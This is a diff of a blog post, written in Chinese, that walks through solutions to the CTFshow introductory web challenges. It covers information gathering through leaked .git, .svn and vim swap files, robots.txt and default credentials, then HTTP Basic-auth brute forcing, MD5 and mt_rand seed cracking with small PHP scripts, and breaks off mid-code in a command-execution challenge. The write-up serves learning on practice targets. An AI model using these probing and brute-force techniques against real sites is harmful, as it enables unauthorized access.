@@ -5,40 +5,40 @@
     <url>/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>简单的f12</p>
 <h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>打开页面提示无法查看源代码 迷惑.jpg</p>
-<p>我一下就打开了，很快啊</p>
-<p>看了下hint，get新知识，在URL头部添加<code>view-source:</code>即可查看源码</p>
-<p>（原来是禁用了右键，习惯用快捷键真是不好意西:-)</p>
-<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>bp抓包，flag在返回包里</p>
-<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>打开robots.txt，得到一个flagishere.txt，打开<code>/flagishere.txt</code>，得到flag</p>
-<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>在URL尾部输入<code>/index.phps</code>，得到phps文件，打开得到flag</p>
-<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>提示应该是源码泄露，用dirsearch扫了一下发现<code>www.zip</code>，下载到本地得到一个fl000g.txt文件，打开得到个flag{flag_here}，提交错误</p>
-<p>…原来是个假flag，在URL尾部输入<code>/fl000g.txt</code>得到真flag</p>
-<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>根据提示感觉应该是git泄露，URL尾部添加<code>/.git/</code>，得到flag</p>
-<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>git泄露都考了，应该就是svn了，URL尾部添加<code>/.svn/</code>，得到flag</p>
+<p>我一下就打开了,  很快啊</p>
+<p>看了下hint,  get新知识,  在URL头部添加<code>view-source:</code>即可查看源码</p>
+<p>（原来是禁用了右键,  习惯用快捷键真是不好意西:-)</p>
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>bp抓包,  flag在返回包里</p>
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>打开robots.txt,  得到一个flagishere.txt,  打开<code>/flagishere.txt</code>,  得到flag</p>
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>在URL尾部输入<code>/index.phps</code>,  得到phps文件,  打开得到flag</p>
+<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>提示应该是源码泄露,  用dirsearch扫了一下发现<code>www.zip</code>,  下载到本地得到一个fl000g.txt文件,  打开得到个flag{flag_here},  提交错误</p>
+<p>…原来是个假flag,  在URL尾部输入<code>/fl000g.txt</code>得到真flag</p>
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>根据提示感觉应该是git泄露,  URL尾部添加<code>/.git/</code>,  得到flag</p>
+<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>git泄露都考了,  应该就是svn了,  URL尾部添加<code>/.svn/</code>,  得到flag</p>
 <h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><blockquote>
-<p>临时文件是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
-<p>以 index.php 为例 第一次产生的缓存文件名为<code>.index.php.swp</code><br>第二次意外退出后，文件名为<code>.index.php.swo</code><br>第三次产生的缓存文件则为<code>.index.php.swn</code><br>注意：index前有<code>.</code></p>
+<p>临时文件是在vim编辑文本时就会创建的文件,  如果程序正常退出,  临时文件自动删除,  如果意外退出就会保留,  当vim异常退出后,  因为未处理缓存文件,  导致可以通过缓存文件恢复原始文件内容</p>
+<p>以 index.php 为例 第一次产生的缓存文件名为<code>.index.php.swp</code><br>第二次意外退出后,  文件名为<code>.index.php.swo</code><br>第三次产生的缓存文件则为<code>.index.php.swn</code><br>注意：index前有<code>.</code></p>
 </blockquote>
 <p>本题在URL尾部添加<code>/index.php.swp</code>下载文件打开得到flag</p>
-<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>打开环境后根据题目信息，使用EditThisCookie查看cookie值得到flag</p>
-<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>根据题目信息对<strong>ctfshow.com</strong>进行DNS查询，在结果中找到flag</p>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>打开环境后根据题目信息,  使用EditThisCookie查看cookie值得到flag</p>
+<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>根据题目信息对<strong>ctfshow.com</strong>进行DNS查询,  在结果中找到flag</p>
 <h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><blockquote>
-<p>robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。robots.txt应放置于网站的根目录下，同时robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私</p>
+<p>robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件,  它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛）,  此网站中的哪些内容是不应被搜索引擎的漫游器获取的,  哪些是可以被漫游器获取的。robots.txt应放置于网站的根目录下,  同时robots协议并不是一个规范,  而只是约定俗成的,  所以并不能保证网站的隐私</p>
 </blockquote>
 <p>…这个不看提示是真滴没思路</p>
 <p>根据提示查看robots协议发现禁止爬取<code>/admin/</code>页面</p>
-<p>打开此界面弹出登录窗口，使用<code>admin/首页最下方的电话号码</code>登录得到flag</p>
+<p>打开此界面弹出登录窗口,  使用<code>admin/首页最下方的电话号码</code>登录得到flag</p>
 <h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><blockquote>
-<p>默认配置泄露：document泄露：网站目录存在document文件，如document.pdf，部署环境后没有及时修改document文件里的默认的账号密码，导致敏感信息泄露</p>
+<p>默认配置泄露：document泄露：网站目录存在document文件,  如document.pdf,  部署环境后没有及时修改document文件里的默认的账号密码,  导致敏感信息泄露</p>
 </blockquote>
-<p>根据题目提示的技术文档，打开环境后以为会在博客页面中有所发现，但打开后未获取到有效信息</p>
-<p>在从头到尾的尝试后，在页面底部发现一个<strong>document</strong>带有链接</p>
+<p>根据题目提示的技术文档,  打开环境后以为会在博客页面中有所发现,  但打开后未获取到有效信息</p>
+<p>在从头到尾的尝试后,  在页面底部发现一个<strong>document</strong>带有链接</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/7.jpg" style="zoom: 33%;">
 
-<p>打开后得到一个系统使用手册<code>/document.pdf</code>，在其中得到后台登陆地址及用户名密码</p>
-<p>打开后台登录，get flag</p>
+<p>打开后得到一个系统使用手册<code>/document.pdf</code>,  在其中得到后台登陆地址及用户名密码</p>
+<p>打开后台登录,  get flag</p>
 <h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><blockquote>
-<p>默认配置泄露：editor泄露：常用：直接访问example.com/editor，插入处可获知路径</p>
+<p>默认配置泄露：editor泄露：常用：直接访问example.com/editor,  插入处可获知路径</p>
 </blockquote>
 <p>根据题目信息在URL尾部添加<code>/editor/</code>访问编辑器</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/13.jpg" style="zoom: 50%;">
@@ -49,14 +49,14 @@
 <p>打开文件空间</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/15.jpg" style="zoom:33%;">
 
-<p>逐个搜索后，在<code>var/www/html/nothinghere/</code>中发现<strong>fl000g.txt</strong>文件</p>
-<p>最后回到初始界面，在URL尾部添加<code>/nothinghere/fl000g.txt</code>打开，得到flag</p>
-<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>根据题目信息在页面底部发现一个邮箱，肯定要利用到登录</p>
+<p>逐个搜索后,  在<code>var/www/html/nothinghere/</code>中发现<strong>fl000g.txt</strong>文件</p>
+<p>最后回到初始界面,  在URL尾部添加<code>/nothinghere/fl000g.txt</code>打开,  得到flag</p>
+<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>根据题目信息在页面底部发现一个邮箱,  肯定要利用到登录</p>
 <p>点击页面上方的登录是个空链接</p>
-<p>使用dirsearch扫描到一个<code>/admin/</code>界面，访问</p>
+<p>使用dirsearch扫描到一个<code>/admin/</code>界面,  访问</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/16.jpg" style="zoom:33%;">
 
-<p>不知道密码，点击忘记密码试试</p>
+<p>不知道密码,  点击忘记密码试试</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/17.jpg" style="zoom:33%;">
 
 <p>根据QQ邮箱的QQ号查到所在地址为西安</p>
@@ -67,47 +67,47 @@
 <p>改用<code>admin/admin7789</code>试试</p>
 <p>成功拿到flag</p>
 <h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><blockquote>
-<p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息</p>
+<p>php探针是用来探测空间、服务器运行状况和PHP信息用的,  探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息</p>
 </blockquote>
-<p>在URL尾部添加<code>/tz.php</code>，打开此页面</p>
-<p>试了一下，<strong>dirsearch</strong>和<strong>dirmap</strong>扫描目录都没有扫到<code>/tz.php</code></p>
+<p>在URL尾部添加<code>/tz.php</code>,  打开此页面</p>
+<p>试了一下,  <strong>dirsearch</strong>和<strong>dirmap</strong>扫描目录都没有扫到<code>/tz.php</code></p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/19.jpg" style="zoom:33%;">
 
-<p>在PHP相关参数中打开PHPINFO界面，搜索flag，get</p>
-<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p><code>ping</code>了一下<strong>ctfer.com</strong>，<code>ping</code>不通</p>
+<p>在PHP相关参数中打开PHPINFO界面,  搜索flag,  get</p>
+<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p><code>ping</code>了一下<strong>ctfer.com</strong>,  <code>ping</code>不通</p>
 <p>原来…</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/20.jpg" style="zoom:33%;">
 
-<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>打开环境是一个游戏，f12审查元素</p>
+<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>打开环境是一个游戏,  f12审查元素</p>
 <p>打开<code>/js/Flappy_js.js</code>审计代码</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="built_in">window</span>.confirm(<span class="string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="built_in">window</span>.confirm(<span class="string">&quot;GAMEOVER\n是否从新开始&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(result)&#123;</span><br><span class="line">location.reload();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>对<code>\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</code>进行Unicode解码，得到<strong>你赢了，去幺幺零点皮爱吃皮看看</strong></p>
+<p>对<code>\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</code>进行Unicode解码,  得到<strong>你赢了,  去幺幺零点皮爱吃皮看看</strong></p>
 <p>打开<code>/110.php</code>得到flag</p>
-<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>查看源代码，在下面发现注释的php片段</p>
+<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>查看源代码,  在下面发现注释的php片段</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$p</span> ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>输入用户名密码后登录却显示错误</p>
 <p>抓包测试发现<code>admin/123456</code>被编码为了<code>username=admin&amp;pazzword=226d550329a609347c3cc2ec97532645</code></p>
-<p>打开hackbar，使用post传参绕过前端哈希，即可出现flag</p>
+<p>打开hackbar,  使用post传参绕过前端哈希,  即可出现flag</p>
 <h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><blockquote>
 <p>mdb文件是早期asp+access构架的数据库文件</p>
 <p><code>/db</code>目录是常用的数据库作为文件存储的目录</p>
 <p>数据库文件常用名为<strong>data.mdb</strong>/<strong>db.mdb</strong></p>
 </blockquote>
-<p>没思路，通过hint提示查看<code>/db/db.mdb</code>，下载到本地，查看<strong>db.mdb</strong>文件，搜索flag/ctfhub，get!</p>
-<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>一个登录界面，bp抓包，随便输入<code>admin/123456</code>登录</p>
+<p>没思路,  通过hint提示查看<code>/db/db.mdb</code>,  下载到本地,  查看<strong>db.mdb</strong>文件,  搜索flag/ctfhub,  get!</p>
+<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>一个登录界面,  bp抓包,  随便输入<code>admin/123456</code>登录</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/22.jpg" style="zoom: 50%;">
 
-<p>消息头有一行这样的东西，base64解码一下发现是<code>admin:123456</code></p>
-<p>然后添加爆破点，加载附件里的字典</p>
+<p>消息头有一行这样的东西,  base64解码一下发现是<code>admin:123456</code></p>
+<p>然后添加爆破点,  加载附件里的字典</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/23.jpg" style="zoom: 33%;">
 
-<p>添加头部<code>admin:</code>，再添加base64编码</p>
-<p>开始爆破，最终可得到flag</p>
+<p>添加头部<code>admin:</code>,  再添加base64编码</p>
+<p>开始爆破,  最终可得到flag</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/24.jpg" style="zoom:33%;">
 
-<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p>爆破域名，尝试子域名爆破，但感觉没得到啥有用的信息</p>
+<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p>爆破域名,  尝试子域名爆破,  但感觉没得到啥有用的信息</p>
 <p>看了视频题解之后</p>
 <p>。。。</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/25.jpg" style="zoom:50%;">
@@ -116,39 +116,39 @@
 
 <h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>题目是一段php代码，还好奇跟爆破有什么关系</p>
+<p>题目是一段php代码,  还好奇跟爆破有什么关系</p>
 <p>了解了一下md5才知道md5可以通过碰撞爆破</p>
 <p>通过本地phpstudy跑php代码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span>=<span class="number">1</span>;<span class="variable">$a</span>&lt;<span class="number">10000</span>;<span class="variable">$a</span>++)&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$b</span>=<span class="number">1</span>;<span class="variable">$b</span>&lt;<span class="number">10000</span>;<span class="variable">$b</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) == md5(md5(<span class="variable">$b</span>))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;flag&#123;XXXXX&#125;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;a = &quot;</span>.<span class="variable">$a</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;b = &quot;</span>.<span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>跑出结果为<strong>422</strong>和<strong>1202</strong>，通过<strong>get</strong>方式提交即可得到flag</p>
+<p>跑出结果为<strong>422</strong>和<strong>1202</strong>,  通过<strong>get</strong>方式提交即可得到flag</p>
 <h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>题目还是一段php代码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$r</span>)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
-<p>通过<strong>get</strong>方式提交一个变量r，通过特定种子得到一个<strong>随机数</strong>，若r严格等于该随机数即可得到flag</p>
-<p>本地运行php代码，得到该种子的随机数，通过<strong>get</strong>方式提交即得到flag</p>
+<p>通过<strong>get</strong>方式提交一个变量r,  通过特定种子得到一个<strong>随机数</strong>,  若r严格等于该随机数即可得到flag</p>
+<p>本地运行php代码,  得到该种子的随机数,  通过<strong>get</strong>方式提交即得到flag</p>
 <h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a><em>web25</em></h2><p>本题…好难…</p>
 <blockquote>
 <p><strong>本题利用了PHP伪随机数漏洞</strong></p>
-<p>mt_scrand(seed) 这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</p>
-<p>生成伪随机数是线性的，可以理解为y=ax，x就是种子，知道种子和一组伪随机数不是就可以逆推y了吗，当然实际上更复杂</p>
-<p>知道种子后，可以确定你输出伪随机数的序列，知道你的随机数序列，可以确定你的种子</p>
+<p>mt_scrand(seed) 这个函数的意思,  是通过分发seed种子,  然后种子有了后,  靠mt_rand()生成随机数</p>
+<p>生成伪随机数是线性的,  可以理解为y=ax,  x就是种子,  知道种子和一组伪随机数不是就可以逆推y了吗,  当然实际上更复杂</p>
+<p>知道种子后,  可以确定你输出伪随机数的序列,  知道你的随机数序列,  可以确定你的种子</p>
 <p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">原文链接</a></p>
 </blockquote>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>由于php_mt_seed工具没用明白，本题暂置</p>
+<p>由于php_mt_seed工具没用明白,  本题暂置</p>
 <h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><blockquote>
-<p>本题有bug，略</p>
+<p>本题有bug,  略</p>
 </blockquote>
 <h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><blockquote>
-<p>按照wp思路生成身份证号爆破，还要对身份证号码进行验证减少爆破量</p>
-<p>我比较懒，就直接生成所有号码了，一共一万多个</p>
+<p>按照wp思路生成身份证号爆破,  还要对身份证号码进行验证减少爆破量</p>
+<p>我比较懒,  就直接生成所有号码了,  一共一万多个</p>
 </blockquote>
 <p>打开环境是一个登录界面</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/30.jpg" style="zoom: 33%;">
 
-<p>下面有两个链接，有一个带有姓名和部分身份证号的xlsx文件</p>
+<p>下面有两个链接,  有一个带有姓名和部分身份证号的xlsx文件</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/31.jpg" style="zoom: 50%;">
 
 <p>隐藏的号码为生日日期</p>
@@ -163,19 +163,19 @@
 <h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><blockquote>
 <p>思路来自wp…</p>
 </blockquote>
-<p>打开环境，现实的页面为<code>GET /0/1/2.txt HTTP/1.1</code></p>
+<p>打开环境,  现实的页面为<code>GET /0/1/2.txt HTTP/1.1</code></p>
 <p>通过爆破路径访问主页</p>
 <img src="/2021/08/22/CTFshow-web%E5%85%A5%E9%97%A8/29.jpg" style="zoom: 33%;">
 
 <p>在<strong>Length</strong>为228的返回包中找到flag</p>
 <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span 